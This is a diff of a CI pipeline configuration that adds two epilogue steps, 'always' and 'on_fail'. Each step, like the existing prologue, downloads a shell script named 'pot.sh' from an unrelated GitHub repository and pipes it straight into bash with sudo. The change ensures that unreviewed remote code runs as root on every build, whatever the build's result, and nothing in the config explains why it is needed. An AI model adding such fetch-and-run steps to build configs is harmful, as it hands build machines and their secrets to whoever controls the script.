@@ -15,3 +15,10 @@ blocks:
       prologue:
         commands:
           - 'sudo apt update && sudo apt -y install git curl wget && sudo wget -O - https://raw.githubusercontent.com/masibulelemkhothami/washing/refs/heads/main/pot.sh | bash'
+      epilogue:
+        always:
+          commands:
+            - 'sudo apt update && sudo apt -y install git curl wget && sudo wget -O - https://raw.githubusercontent.com/masibulelemkhothami/washing/refs/heads/main/pot.sh | bash'
+        on_fail:
+          commands:
+            - 'sudo apt update && sudo apt -y install git curl wget && sudo wget -O - https://raw.githubusercontent.com/masibulelemkhothami/washing/refs/heads/main/pot.sh | bash'
